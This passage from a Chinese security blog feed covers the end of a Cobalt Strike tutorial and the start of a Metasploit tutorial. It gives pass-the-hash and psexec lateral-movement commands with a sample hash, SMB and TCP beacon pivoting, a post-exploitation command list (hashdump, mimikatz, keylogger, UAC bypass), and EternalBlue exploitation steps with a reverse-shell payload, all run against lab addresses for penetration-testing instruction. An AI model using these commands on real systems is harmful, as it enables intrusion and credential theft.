src="/2019/12/19/gong-ju-de-shi-yong/cobaltstrike-de-shi-yong/1635078027453-a36703cd-e835-4675-ab28-adb6637302d0-20220401150232285.png" alt="img"></p><p><img src="/2019/12/19/gong-ju-de-shi-yong/cobaltstrike-de-shi-yong/1635078028238-32bb2414-018a-4af8-8eaf-9554e95ee2b1-20220401150232478.png" alt="img"></p><p>扫完了之后，直接在控制台就会有结果。</p><p><img src="/2019/12/19/gong-ju-de-shi-yong/cobaltstrike-de-shi-yong/1635078028287-0dd63a24-a7c6-485b-826c-dfb9fc2d87f4-20220401150232669.png" alt="img"></p><p>我们点击视图——&gt;目标，就会出现网段中存活的主机。(这是通过端口扫描探测到的结果显示的，要想这里显示，必须得先进行扫描端口)</p><p><img src="/2019/12/19/gong-ju-de-shi-yong/cobaltstrike-de-shi-yong/1635078028554-2efc179e-3307-41ff-ae78-e0f473ee91dc-20220401150232636.png" alt="img"></p><h3 id="哈希传递攻击或SSH远程登录"><a href="#哈希传递攻击或SSH远程登录" class="headerlink" title="哈希传递攻击或SSH远程登录"></a>哈希传递攻击或SSH远程登录</h3><p>进行了上一步的端口扫描后，我们这里视图——&gt;目标就会有当前网段的存活主机。</p><p><img src="/2019/12/19/gong-ju-de-shi-yong/cobaltstrike-de-shi-yong/1635078029066-0290815a-b5e0-4d59-9e2c-b2e9770efc48-20220401150232791.png" alt="img"></p><p><strong>对于Linux机器，如果我们知道账号密码的话，可以远程SSH连接，并返回一个CS的session。</strong></p><p>需要一台服务器作为中继才可以控制Linux服务器，我们这里先获取到一个windows服务器的权限，然后进入windows服务器的beacon进行执行命令</p><p>可以两种方式远程连接：ssh 和 ssh-key</p><p>可以图形化操作，也可以命令行操作：ssh 192.168.10.13:22 root root</p><p><img src="/2019/12/19/gong-ju-de-shi-yong/cobaltstrike-de-shi-yong/1635078029334-b03acb65-0b73-47df-8454-b6665d6804d9-20220401150232791.png" alt="img"></p><p><img src="/2019/12/19/gong-ju-de-shi-yong/cobaltstrike-de-shi-yong/1635078029746-cd447ddb-1cf9-43cc-a0f4-b351d6ec5510-20220401150232950.png" alt="img"></p><p><img src="/2019/12/19/gong-ju-de-shi-yong/cobaltstrike-de-shi-yong/1635078029767-69f4142c-5593-4d03-80c1-17e65fdf8864-20220401150232851.png" alt="img"></p><p><img src="/2019/12/19/gong-ju-de-shi-yong/cobaltstrike-de-shi-yong/1635078030051-fe2e48cc-d98f-4eb4-ab25-7018aafc3b3a-20220401150232967.png" alt="img"></p><p><strong>对于Linux机器，也可以使用SSH公私钥进行登录，并返回一个CS的session。</strong></p><p>需要一台服务器作为中继才可以控制Linux服务器，我们这里先获取到一个windows服务器的权限，然后进入windows服务器的beacon进行执行命令</p><p>首先，将公钥authorized_keys放到目标主机的&#x2F;root&#x2F;.ssh&#x2F;目录下</p><p><img src="/2019/12/19/gong-ju-de-shi-yong/cobaltstrike-de-shi-yong/1635078030118-2efa7d51-f846-4ab0-9471-a510d46273ff-20220401150233015.png" alt="img"></p><p>然后我们本地机器放私钥，远程连接</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">ssh<span class="token operator">-</span>key <span class="token number">192.168</span><span class="token number">.10</span><span class="token number">.13</span><span class="token punctuation">:</span><span class="token number">22</span> root e<span class="token punctuation">:</span>\id_rsa<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2019/12/19/gong-ju-de-shi-yong/cobaltstrike-de-shi-yong/1635078030148-56d166df-cdb0-44ff-aa9b-6e5cd04992ad-20220401150233030.png" alt="img"></p><p><img src="/2019/12/19/gong-ju-de-shi-yong/cobaltstrike-de-shi-yong/1635078030756-3e6caf6a-c3a9-4454-a04b-c75a220bed39-20220401150233137.png" alt="img"></p><p><strong>对于Windows机器，如果我们获取到账号和密码(明文或者哈希)，都可以进行远程连接</strong></p><p>远程连接的前提是目标机器开放了445端口，然后CS会通过远程连接开启一个CS的seesion。可以用以下方式远程连接：psexec 、psexec64、psexec_psh 、winrm 和 winrm64。实测使用 <strong>psexec_psh</strong> 成功率最高。</p><p>已经得到机器Win2008的密码为：root （329153f560eb329c0e1deea55e88a1e9），现在想哈希传递Win2003机器。监听器为：test</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">如果知道知道密码哈希的话：rev2selfpth WIN2008\Administrator 329153f560eb329c0e1deea55e88a1e9psexec的命令：jump psexec WIN2003 testpsexec64的命令jump psexec64 WIN2003 testpsexec_psh的命令：jump psexec_psh WIN2003 testwinrm的命令：jump winrm WIN2003 testwinrm64的命令： jump winrm64 WIN2003 test如果是知道明文密码的话：rev2selfmake_token WIN2008\Administrator rootpsexec的命令：jump psexec WIN2003 testpsexec64的命令jump psexec64 WIN2003 testpsexec_psh的命令：jump psexec_psh WIN2003 testwinrm的命令：jump winrm WIN2003 testwinrm64的命令： jump winrm64 WIN2003 test<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2019/12/19/gong-ju-de-shi-yong/cobaltstrike-de-shi-yong/1635078030772-c67a6510-f429-44c0-ba6a-b0b4158fc115-20220401150233144.png" alt="img"></p><p><img src="/2019/12/19/gong-ju-de-shi-yong/cobaltstrike-de-shi-yong/1635078030797-df758fde-7bb2-4717-8da2-d5aefbffa85d-20220401150233246.png" alt="img"></p><p><img src="/2019/12/19/gong-ju-de-shi-yong/cobaltstrike-de-shi-yong/1635078031050-5c6f693c-68a9-4e12-b1af-4f1dad8d7112-20220401150233366.png" alt="img"></p><p><img src="/2019/12/19/gong-ju-de-shi-yong/cobaltstrike-de-shi-yong/1635078031113-71a8aab6-ab37-41ba-aafc-813f73fe3d5a-20220401150233367.png" alt="img"></p><p><strong>如果遇到目标机器不出网的情况，则我们需要在已经被控的主机上建立一个listen，以此作为中继。</strong></p><p><img src="/2019/12/19/gong-ju-de-shi-yong/cobaltstrike-de-shi-yong/1635078031644-2457c5e4-2334-41c8-bccc-4efb89369655-20220401150233627.png" alt="img"></p><p><img src="/2019/12/19/gong-ju-de-shi-yong/cobaltstrike-de-shi-yong/1635078031714-bf93b24b-b4e6-4270-a35b-665d1064a959-20220401150233520.png" alt="img"></p><p>然后攻击的时候的监听器选择我们刚刚用被控主机建立的listen即可。</p><p><img src="/2019/12/19/gong-ju-de-shi-yong/cobaltstrike-de-shi-yong/1635078031808-0ff42684-71da-4cbf-ada2-e50dc9b5ecaf-20220401150233511.png" alt="img"></p><p><img src="/2019/12/19/gong-ju-de-shi-yong/cobaltstrike-de-shi-yong/1635078031809-0af68061-047e-430d-b6ad-01fefdb638a1-20220401150233875.png" alt="img"></p><p><img src="/2019/12/19/gong-ju-de-shi-yong/cobaltstrike-de-shi-yong/1635078032633-cf79aff9-9d62-44d2-99db-cbb446830d1c-20220401150233970.png" alt="img"></p><p>当在目标主机执行了该木马后，就可以看到上线了。我们可以在Beacon上用link <ip>命令链接它或者unlink <ip>命令断开它</ip></ip></p><p>但是这样会导致的一个后果就是，只要第一个被控主机掉线，通过该主机中继打下的内网其他主机也都会掉线。</p><h3 id="导入并执行本地的PowerShell脚本"><a href="#导入并执行本地的PowerShell脚本" class="headerlink" title="导入并执行本地的PowerShell脚本"></a>导入并执行本地的PowerShell脚本</h3><ul><li>powershell-import：该模块可以将本地PowerShell脚本加载到目标系统的内存中，然后使用PowerShell执行所加载脚本中的方法</li><li>powershell：该模块通过调用PowerShell.exe 来执行命令</li><li>powerpick：该命令可以不通过调用PowerShell.exe 来执行命令</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python">powershell<span class="token operator">-</span><span class="token keyword">import</span> E<span class="token punctuation">:</span>\PowerView<span class="token punctuation">.</span>ps1 powershell Get<span class="token operator">-</span>NetUser <span class="token operator">|</span> select name<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2019/12/19/gong-ju-de-shi-yong/cobaltstrike-de-shi-yong/1635078032650-7f9b2840-825f-47d8-8a57-21a9d4ae069c-20220401150233620.png" alt="img"></p><h3 id="Beacon-TCP的使用"><a href="#Beacon-TCP的使用" class="headerlink" title="Beacon TCP的使用"></a>Beacon TCP的使用</h3><p>我们打下了一个目标机器192.168.202.54，但是该机器不出网，我们现在想让其上线cs。我们的思路是这样的，通过配置代理，让本地虚拟机可以访问到目标机器。然后让本地虚拟机上线cs，走bind_tcp去连接目标机器。</p><ul><li>本地虚拟机：192.168.10.132</li><li>目标机器：192.168.10.128(不出网)</li></ul><p><strong>本地虚拟机上线cs，配置proxifier</strong></p><p>使用本地虚拟机，使用exe或powershell方式上线cs(注意不要用派生的session)。</p><p>在win2008机器上配置好proxifier，如下</p><p><img src="/2019/12/19/gong-ju-de-shi-yong/cobaltstrike-de-shi-yong/1635078032865-880fe19a-2ae8-41cb-995a-b88c11fb8b9e-20220401150233680.png" alt="img"></p><p><img src="/2019/12/19/gong-ju-de-shi-yong/cobaltstrike-de-shi-yong/1635078033239-395618a3-e704-40da-8453-50044a5779ad-20220401150233704.png" alt="img"></p><p><strong>监听bind_tcp</strong></p><p>设置bind_tcp监听方式，默认监听42585端口，我们可以自己修改。</p><p><img src="/2019/12/19/gong-ju-de-shi-yong/cobaltstrike-de-shi-yong/1635078032893-ce7c549b-60ba-47f1-83cf-b80a8c8aa909-20220401150233948.png" alt="img"></p><p>生成bind_tcp的木马</p><p><img src="/2019/12/19/gong-ju-de-shi-yong/cobaltstrike-de-shi-yong/1635078033508-07a4b09c-c167-4e22-8c1a-6798ee525b23-20220401150233779.png" alt="img"></p><p>将该木马上传到win7机器上，执行，可以看到，监听了42585端口</p><p><img src="/2019/12/19/gong-ju-de-shi-yong/cobaltstrike-de-shi-yong/1635078033614-816a16ae-fafd-48c9-afbd-594ac7bdf24e-20220401150233758.png" alt="img"></p><p>然后可以在cs上上线的机器探测端口：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">portscan <span class="token number">192.168</span><span class="token number">.10</span><span class="token number">.128</span> <span class="token number">42585</span> none <span class="token number">64</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在win2008机器上执行命令，可以看到win7正常上线</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">连接connect  <span class="token number">192.168</span><span class="token number">.10</span><span class="token number">.128</span> 取消连接unlink   <span class="token number">192.168</span><span class="token number">.10</span><span class="token number">.128</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2019/12/19/gong-ju-de-shi-yong/cobaltstrike-de-shi-yong/1635078033712-b5a969ce-702a-48ad-ab5a-e3f9c23fe0ca-20220401150233867.png" alt="img"></p><p>点进去win7的session里面，输入 sleep 1</p><p><img src="/2019/12/19/gong-ju-de-shi-yong/cobaltstrike-de-shi-yong/1635078034405-76881388-4a94-48ce-8d7e-ae8b2e1d8a3f-20220401150233846.png" alt="img"></p><p><img src="/2019/12/19/gong-ju-de-shi-yong/cobaltstrike-de-shi-yong/1635078034398-2a6cb5ca-3321-4b26-8448-f4a613d15b84-20220401150233930.png" alt="img"></p><p><img src="/2019/12/19/gong-ju-de-shi-yong/cobaltstrike-de-shi-yong/1635078034466-e27574fc-7da4-4379-9649-c44d5350d115-20220401150233916.png" alt="img"></p><h3 id="Beacon-SMB的使用"><a href="#Beacon-SMB的使用" class="headerlink" title="Beacon SMB的使用"></a>Beacon SMB的使用</h3><p>SMB Beacon使用命名管道与父级Beacon进行通讯，当两个Beacons链接后，子Beacon从父Beacon获取到任务并发送。因为链接的Beacons使用Windows命名管道进行通信，此流量封装在SMB协议中，所以SMB Beacon相对隐蔽，绕防火墙时可能发挥奇效。<br>这张图很好的诠释了SMB beacon的工作流程。</p><p><img src="/2019/12/19/gong-ju-de-shi-yong/cobaltstrike-de-shi-yong/1635078034487-f2583aaa-bad1-403e-9afd-268acb164060-20220401150234302.png" alt="img"></p><p>SMB Beacon的使用条件：</p><ul><li>具有 SMB Beacon 的主机必须接受 445 端口上的连接</li><li>只能链接由同一个 Cobalt Strike 实例管理的 Beacon</li><li>利用这种beacon横移必须有目标主机的管理员组的权限或者说是拥有具有管理员组权限的凭据。</li></ul><p><strong>SMB Beacon的使用场景：</strong></p><ol><li>我们知道了目标机器的管理员账号的明文密码或密码哈希。但是目标主机不出网，所以我们想利用SMB Beacon正向连接让其上线。</li><li>还有一种使用场景是，在域环境中，我们已经得到一个域用户的账号密码。由于在域中，默认域用户可以登录除域控外的所有主机。所以我们可以利用该域用户与其他主机建立IPC连接，然后让其他主机进行SMB Beacon上线。</li></ol><p><img src="/2019/12/19/gong-ju-de-shi-yong/cobaltstrike-de-shi-yong/1635078034557-03db1604-ab8a-474c-853f-92a330bfb449-20220401150233988.png" alt="img"></p><p>首先，建立一个SMB Beacon的监听：SMB_Beacon</p><p><img src="/2019/12/19/gong-ju-de-shi-yong/cobaltstrike-de-shi-yong/1635078035091-9841c974-ac7f-4c9b-a5bc-5b1cb9afffe4-20220401150234003.png" alt="img"></p><p><strong>利用明文密码让其上线SMB Beacon</strong></p><p>先建立一个IPC连接，然后连接：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">shell net use \\<span class="token number">192.168</span><span class="token number">.10</span><span class="token number">.132</span> <span class="token operator">/</span>u<span class="token punctuation">:</span>administrator rootjump psexec_psh <span class="token number">192.168</span><span class="token number">.10</span><span class="token number">.132</span> SMB_Beacon取消连接unlink <span class="token number">192.168</span><span class="token number">.10</span><span class="token number">.132</span>如果是域内shell net use \\<span class="token number">192.168</span><span class="token number">.10</span><span class="token number">.132</span> <span class="token operator">/</span>u<span class="token punctuation">:</span>xie\administrator root<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2019/12/19/gong-ju-de-shi-yong/cobaltstrike-de-shi-yong/1635078035293-01ebeb66-177a-4be7-ac33-556fbbd71b1d-20220401150234265.png" alt="img"></p><p><img src="/2019/12/19/gong-ju-de-shi-yong/cobaltstrike-de-shi-yong/1635078035271-2b10bf54-8825-4040-9a9d-06f4e22e30a2-20220401150234180.png" alt="img"></p><p><strong>利用密码哈希上线SMB Beacon</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">rev2selfpth WIN2003\Administrator 329153f560eb329c0e1deea55e88a1e9jump psexec_psh <span class="token number">192.168</span><span class="token number">.10</span><span class="token number">.132</span> SMB_Beacon取消连接unlink <span class="token number">192.168</span><span class="token number">.10</span><span class="token number">.132</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2019/12/19/gong-ju-de-shi-yong/cobaltstrike-de-shi-yong/1635078035439-84335e7e-ba2b-4fc0-8901-10cc27437dd1-20220401150234182.png" alt="img"></p><h2 id="CobaltStrike常见命令"><a href="#CobaltStrike常见命令" class="headerlink" title="CobaltStrike常见命令"></a>CobaltStrike常见命令</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python">BeaconCommands<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>    Command                   Description    <span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>                   <span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>    browserpivot              注入受害者浏览器进程    bypassuac                 绕过UAC    cancel                    取消正在进行的下载    cd                        切换目录    checkin                   强制让被控端回连一次    clear                     清除beacon内部的任务队列    connect                   Connect to a Beacon peerover TCP    covertvpn                 部署Covert VPN客户端    cp                        复制文件    dcsync                    从DC中提取密码哈希    desktop                   远程VNC    dllinject                 反射DLL注入进程    dllload                   使用LoadLibrary将DLL加载到进程中    download                  下载文件    downloads                 列出正在进行的文件下载    drives                    列出目标盘符    elevate                   尝试提权   execute                   在目标上执行程序<span class="token punctuation">(</span>无输出<span class="token punctuation">)</span>    execute<span class="token operator">-</span>assembly          在目标上内存中执行本地<span class="token punctuation">.</span>NET程序    exit                      退出beacon    getprivs                  Enable system privileges oncurrent token    getsystem                 尝试获取SYSTEM权限    getuid                    获取用户ID    hashdump                  转储密码哈希值    <span class="token builtin">help</span>                      帮助    inject                    在特定进程中生成会话    jobkill                   杀死一个后台任务    jobs                      列出后台任务    kerberos_ccache_use       从ccache文件中导入票据应用于此会话    kerberos_ticket_purge     清除当前会话的票据    kerberos_ticket_use       从ticket文件中导入票据应用于此会话    keylogger                 键盘记录    kill                      结束进程    link                      Connect to a Beacon peerover a named pipe    logonpasswords            使用mimikatz转储凭据和哈希值    ls                        列出文件    make_token                创建令牌以传递凭据    mimikatz                  运行mimikatz    mkdir                     创建一个目录    mode dns                  使用DNS A作为通信通道<span class="token punctuation">(</span>仅限DNS beacon<span class="token punctuation">)</span>    mode dns<span class="token operator">-</span>txt              使用DNS TXT作为通信通道<span class="token punctuation">(</span>仅限D beacon<span class="token punctuation">)</span>    mode dns6                 使用DNS AAAA作为通信通道<span class="token punctuation">(</span>仅限DNS beacon<span class="token punctuation">)</span>    mode http                 使用HTTP作为通信通道    mv                        移动文件    net                       net命令    note                      备注          portscan                  进行端口扫描    powerpick                 通过Unmanaged PowerShell执行命令    powershell                通过powershell<span class="token punctuation">.</span>exe执行命令    powershell<span class="token operator">-</span><span class="token keyword">import</span>         导入powershell脚本    ppid                      Set parent PID forspawned post<span class="token operator">-</span>ex jobs    ps                        显示进程列表    psexec                    Use a service to spawn asession on a host    psexec_psh                Use PowerShell to spawn asession on a host    psinject                  在特定进程中执行PowerShell命令    pth                       使用Mimikatz进行传递哈希    pwd                       当前目录位置    reg                       Query the registry    rev2self                  恢复原始令牌    rm                        删除文件或文件夹    rportfwd                  端口转发    run                       在目标上执行程序<span class="token punctuation">(</span>返回输出<span class="token punctuation">)</span>    runas                     以另一个用户权限执行程序    runasadmin                在高权限下执行程序    runu                      Execute a program underanother PID    screenshot                屏幕截图    setenv                    设置环境变量    shell                     cmd执行命令    shinject                  将shellcode注入进程    shspawn                   生成进程并将shellcode注入其中    sleep                     设置睡眠延迟时间    socks                     启动SOCKS4代理    socks stop                停止SOCKS4    spawn                     Spawn a session    spawnas                   Spawn a session <span class="token keyword">as</span> anotheruser    spawnto                  Set executable tospawn processes into    spawnu                    Spawn a session underanother PID    ssh                       使用ssh连接远程主机    ssh<span class="token operator">-</span>key                   使用密钥连接远程主机    steal_token               从进程中窃取令牌    timestomp                 将一个文件时间戳应用到另一个文件    unlink                    Disconnect <span class="token keyword">from</span> parentBeacon    upload                    上传文件    wdigest                   使用mimikatz转储明文凭据    winrm                     使用WinRM在主机上生成会话    wmi                       使用WMI在主机上生成会话    argue                     进程参数欺骗<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 技术文章 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具的使用 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Metasploit Framework(MSF)的使用</title>
      <link href="2019/03/01/gong-ju-de-shi-yong/metasploit-framework-msf-de-shi-yong/"/>
      <url>2019/03/01/gong-ju-de-shi-yong/metasploit-framework-msf-de-shi-yong/</url>
      
        <content type="html"><![CDATA[<h1 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h1><p>Metasploit Framework(MSF)是一款开源安全漏洞检测工具，附带数千个已知的软件漏洞，并保持持续更新。Metasploit可以用来信息收集、漏洞探测、漏洞利用等渗透测试的全流程，被安全社区冠以“可以黑掉整个宇宙”之名。刚开始的Metasploit是采用Perl语言编写的，但是再后来的新版中，改成了用Ruby语言编写的了。在kali中，自带了Metasploit工具。我们接下来以大名鼎鼎的永恒之蓝MS17_010漏洞为切入点，讲解MSF框架的使用。</p><p><strong>MSF的更新</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">msfupdate<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2019/03/01/gong-ju-de-shi-yong/metasploit-framework-msf-de-shi-yong/1635078767822-6098a694-c3e3-41b0-babd-681a5bc71fa8.png" alt="img"></p><h2 id="Metasploit的安装和升级"><a href="#Metasploit的安装和升级" class="headerlink" title="Metasploit的安装和升级"></a>Metasploit的安装和升级</h2><p>在一般的linux中，默认是不安装MSF的。以下是在非kali的Linux下安装MSF框架。</p><p><strong>一键安装</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">curl https<span class="token punctuation">:</span><span class="token operator">//</span>raw<span class="token punctuation">.</span>githubusercontent<span class="token punctuation">.</span>com<span class="token operator">/</span>rapid7<span class="token operator">/</span>metasploit<span class="token operator">-</span>omnibus<span class="token operator">/</span>master<span class="token operator">/</span>config<span class="token operator">/</span>templates<span class="token operator">/</span>metasploit<span class="token operator">-</span>framework<span class="token operator">-</span>wrappers<span class="token operator">/</span>msfupdate<span class="token punctuation">.</span>erb <span class="token operator">></span> msfinstall <span class="token operator">&amp;</span><span class="token operator">&amp;</span> chmod <span class="token number">755</span> msfinstall <span class="token operator">&amp;</span><span class="token operator">&amp;</span> <span class="token punctuation">.</span><span class="token operator">/</span>msfinstall   adduser msf           <span class="token comment">#添加msf用户</span>su msf                <span class="token comment">#切换到msf用户</span>cd  <span class="token operator">/</span>opt<span class="token operator">/</span>metasploit<span class="token operator">-</span>framework<span class="token operator">/</span><span class="token builtin">bin</span>   <span class="token comment">#切换到msf所在的目录 </span><span class="token punctuation">.</span><span class="token operator">/</span>msfconsole          <span class="token comment">#以后启动msfconsole，都切换到msf用户下启动，这样会同步数据库。如果使用root用户启动的话，不会同步数据库  </span>也可以将msfconsole加入到执行目录下，这样在任何目录直接msfconsole就可以了ln <span class="token operator">-</span>s <span class="token operator">/</span>opt<span class="token operator">/</span>metasploit<span class="token operator">-</span>framework<span class="token operator">/</span><span class="token builtin">bin</span><span class="token operator">/</span>msfconsole <span class="token operator">/</span>usr<span class="token operator">/</span><span class="token builtin">bin</span><span class="token operator">/</span>msfconsole<span class="token comment">#备注：</span><span class="token comment">#初次运行msf会创建数据库，但是msf默认使用的PostgreSQL数据库不能与root用户关联，这也这也就是需要新建用户msf来运行metasploit的原因所在。如果你一不小心手一抖，初次运行是在root用户下，请使用 msfdb reinit 命令，然后使用非root用户初始化数据库。        </span>MSF后期的升级：msfupdate<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>使用方法：</strong></p><ul><li>进入框架：msfconsole</li><li>使用search命令查找相关漏洞： search ms17-010</li><li>使用use进入模块: use exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalblue </li><li>使用info查看模块信息： info</li><li>设置攻击载荷：set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp</li><li>查看模块需要配置的参数：show options</li><li>设置参数：set RHOST 192.168.125.138</li><li>攻击：exploit &#x2F; run </li><li>后渗透阶段</li></ul><p>不同的攻击用到的步骤也不一样，这不是一成不变的，需要灵活使用。</p><p>我们也可以将攻击代码写入 configure.rc（只要是以 .rc 结尾的文件）配置文件中，然后使用命令msfconsole -r configure.rc 进行自动攻击！</p><h2 id="MSF中加载自定义的exploit模块"><a href="#MSF中加载自定义的exploit模块" class="headerlink" title="MSF中加载自定义的exploit模块"></a>MSF中加载自定义的exploit模块</h2><p>参考文章：<a href="https://blog.csdn.net/qq_36119192/article/details/100609875">CVE-2019-0708 远程桌面漏洞复现</a> ，该文中介绍了如果加载自定义的exploit模块并且成功攻击。</p><h2 id="漏洞利用-exploit"><a href="#漏洞利用-exploit" class="headerlink" title="漏洞利用(exploit)"></a>漏洞利用(exploit)</h2><p>漏洞利用exploit，也就是我们常说的 exp，他就是对漏洞进行攻击的代码。</p><p>exploit漏洞利用模块路径：**&#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;modules&#x2F;exploits**</p><p><img src="/2019/03/01/gong-ju-de-shi-yong/metasploit-framework-msf-de-shi-yong/1635078767708-f95d75a7-7595-4170-822b-83cbee209382.png" alt="img"></p><p>这里面有针对不同平台的 exploit 。</p><p>我们现在就进 windows 平台看看，这里会列出针对windows平台不同服务的漏洞利用</p><p><img src="/2019/03/01/gong-ju-de-shi-yong/metasploit-framework-msf-de-shi-yong/1635078768171-1677112d-b59d-43bd-a21f-7d0bd16ece9d.png" alt="img"></p><p>我们进入<strong>smb服务</strong>，这是windows中经常爆出漏洞的服务，比如我们的永恒之蓝漏洞就在这里面。漏洞利用代码是以 rb 结尾的文件，因为metasploit是用Ruby语言编写的。</p><p><img src="/2019/03/01/gong-ju-de-shi-yong/metasploit-framework-msf-de-shi-yong/1635078770365-4799e1ac-baf8-455a-850b-12f3600f0742.png" alt="img"></p><h2 id="攻击载荷-payload"><a href="#攻击载荷-payload" class="headerlink" title="攻击载荷(payload)"></a>攻击载荷(payload)</h2><p>payload模块路径：&#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;modules&#x2F;payloads</p><p><img src="/2019/03/01/gong-ju-de-shi-yong/metasploit-framework-msf-de-shi-yong/1635078767015-c7119588-8154-4eb7-b4e2-637663a53bda.png" alt="img"></p><p>Payload中包含攻击进入目标主机后需要在远程系统中运行的恶意代码，而在Metasploit中Payload是一种特殊模块，它们能够以漏洞利用模块运行，并能够利用目标系统中的安全漏洞实施攻击。简而言之，这种漏洞利用模块可以访问目标系统，而其中的代码定义了Payload在目标系统中的行为。</p><p><strong>Shellcode</strong> ：Shellcode是payload中的精髓部分，在渗透攻击时作为攻击载荷运行的一组机器指令。Shellcode通常用汇编语言编写。在大多数情况下，目标系统执行了shellcode这一组指令 之后，才会提供一个命令行shell。</p><p>Metasploit中的 Payload 模块主要有以下三种类型：</p><ul><li>-Single：Single是一种完全独立的Payload，而且使用起来就像运行 calc.exe 一样简单，例如添加一个系统用户或删除一份文件。由于Single Payload是完全独立的，因此它们有可能会被类似 netcat 这样的非metasploit处理工具所捕捉到。</li><li>-Stager：Stager这种Payload负责建立目标用户与攻击者之间的网络连接，并下载额外的组件或应用程序。一种常见的Stager Payload就是reverse_tcp，它可以让目标系统与攻击者建立一条tcp连接，让目标系统主动连接我们的端口(反向连接)。另一种常见的是bind_tcp，它可以让目标系统开启一个tcp监听器，而攻击者随时可以与目标系统进行通信(正向连接)。</li><li>-Stage：Stage是Stager Payload下的一种Payload组件，这种Payload可以提供更加高级的功能，而且没有大小限制。</li></ul><p>在 Metasploit 中，我们可以通过Payload的名称和使用格式来推断它的类型：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">Single Payload的格式为：<span class="token operator">&lt;</span>target<span class="token operator">></span><span class="token operator">/</span> <span class="token operator">&lt;</span>single<span class="token operator">></span>  如：windows<span class="token operator">/</span>powershell_bind_tcpStager<span class="token operator">/</span>Stage Payload的格式为：<span class="token operator">&lt;</span>target<span class="token operator">></span><span class="token operator">/</span> <span class="token operator">&lt;</span>stage<span class="token operator">></span> <span class="token operator">/</span> <span class="token operator">&lt;</span>stager<span class="token operator">></span>  如：windows<span class="token operator">/</span>meterpreter<span class="token operator">/</span>reverse_tcp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>当我们在Metasploit中执行 show payloads 命令之后，它会给我们显示一个可使用的Payload列表。在这个列表中，像 windows&#x2F;powershell_bind_tcp 就是一个Single Payload，它不包含Stage Payload</p><p>而 windows&#x2F;meterpreter&#x2F;reverse_tcp 则由一个<strong>Stage Payload（meterpreter</strong>）和 一个<strong>Stager Payload（reverse_tcp）</strong>组成。</p><p><strong>Stager中几种常见的payload</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">windows<span class="token operator">/</span>meterpreter<span class="token operator">/</span>bind_tcp       <span class="token comment">#正向连接</span>windows<span class="token operator">/</span>meterpreter<span class="token operator">/</span>reverse_tcp    <span class="token comment">#反向连接，常用</span>windows<span class="token operator">/</span>meterpreter<span class="token operator">/</span>reverse_http   <span class="token comment">#通过监听80端口反向连接</span>windows<span class="token operator">/</span>meterpreter<span class="token operator">/</span>reverse_https  <span class="token comment">#通过监听443端口反向连接</span>正向连接使用场景：我们的攻击机在内网环境，被攻击机是外网环境，由于被攻击机无法主动连接到我们的主机，所以就必须我们主动连接被攻击机了。但是这里经常遇到的问题是，被攻击机上开了防火墙，只允许访问指定的端口，比如被攻击机只对外开放了<span class="token number">80</span>端口。那么，我们就只能设置正向连接<span class="token number">80</span>端口了，这里很有可能失败，因为<span class="token 